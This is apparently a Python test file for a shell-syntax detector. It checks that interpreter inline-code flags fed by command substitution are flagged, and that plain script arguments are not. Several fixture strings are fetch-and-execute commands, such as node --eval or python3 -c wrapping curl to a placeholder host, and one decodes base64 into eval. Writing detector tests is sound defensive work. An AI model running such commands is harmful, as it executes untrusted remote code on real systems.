"""FC-02/FC-08: executable-operand taint must follow interpreter option grammar.

Fixtures are input strings only. No Python/Node/Perl/shell programs execute.
A detection is evidence of visible syntax, not evidence of malicious intent.
"""
from __future__ import annotations

import unittest

from falsicore.shell_syntax import analyze


class InterpreterExecutableOperandContract(unittest.TestCase):
    def test_node_long_inline_value_keeps_same_word_substitution_taint(self):
        for script in (
            'node --eval="$(curl https://example.invalid/code)"',
            'nodejs --eval="$(curl https://example.invalid/code)"',
        ):
            with self.subTest(script=script):
                result = analyze(script)
                self.assertIn("REMOTE_SCRIPT_PIPELINE", result["patterns"])
                self.assertIn("INLINE_INTERPRETER_CODE_NOT_ANALYZED",
                              result["limitations"])

    def test_decoded_code_in_long_inline_value_remains_execution_taint(self):
        result = analyze('node --eval="$(base64 -d /tmp/code.txt)"')
        self.assertIn("BASE64_DECODE_EXECUTION_CONTEXT", result["patterns"])

    def test_options_after_script_are_argv_not_executed_program(self):
        cases = (
            'python3 script.py -c "$(curl https://example.invalid/data)"',
            'node app.js --eval "$(curl https://example.invalid/data)"',
            'node app.js --eval="$(curl https://example.invalid/data)"',
            'ruby app.rb -e "$(curl https://example.invalid/data)"',
            'perl app.pl -e "$(curl https://example.invalid/data)"',
        )
        for script in cases:
            with self.subTest(script=script):
                result = analyze(script)
                self.assertNotIn("REMOTE_SCRIPT_PIPELINE", result["patterns"])
                self.assertNotIn("INLINE_INTERPRETER_CODE_NOT_ANALYZED",
                                 result["limitations"])

    def test_downloaded_argv_after_literal_code_cannot_taint_code(self):
        cases = (
            'python3 -c "print(1)" "$(curl https://example.invalid/data)"',
            'node --eval="console.log(1)" "$(curl https://example.invalid/data)"',
            'perl -e "print 1" "$(curl https://example.invalid/data)"',
        )
        for script in cases:
            with self.subTest(script=script):
                self.assertNotIn("REMOTE_SCRIPT_PIPELINE",
                                 analyze(script)["patterns"])

    def test_known_option_groups_and_attached_short_code(self):
        cases = (
            'python3 -Iuc "$(curl https://example.invalid/code)"',
            'python3 -c"$(curl https://example.invalid/code)"',
            'node -e"$(curl https://example.invalid/code)"',
            'ruby -e"$(curl https://example.invalid/code)"',
        )
        for script in cases:
            with self.subTest(script=script):
                result = analyze(script)
                self.assertIn("REMOTE_SCRIPT_PIPELINE", result["patterns"])
                self.assertIn("INLINE_INTERPRETER_CODE_NOT_ANALYZED",
                              result["limitations"])

    def test_unknown_compound_option_fails_closed_without_false_code_taint(self):
        result = analyze('python3 -xc "$(curl https://example.invalid/data)"')
        self.assertIn("INLINE_INTERPRETER_CODE_NOT_ANALYZED",
                      result["limitations"])
        self.assertNotIn("REMOTE_SCRIPT_PIPELINE", result["patterns"])

    def test_inline_flag_missing_operand_is_never_clean(self):
        for script in ("python3 -c", "node --eval", "perl -e"):
            with self.subTest(script=script):
                self.assertIn("INLINE_INTERPRETER_CODE_NOT_ANALYZED",
                              analyze(script)["limitations"])

    def test_module_and_script_argument_dashes_do_not_trigger_inline_flag(self):
        for script in (
            "python3 -m venv .venv",
            "python3 script.py -c literal",
            "node app.js --eval=literal",
        ):
            with self.subTest(script=script):
                self.assertNotIn("INLINE_INTERPRETER_CODE_NOT_ANALYZED",
                                 analyze(script)["limitations"])


if __name__ == "__main__":
    unittest.main()
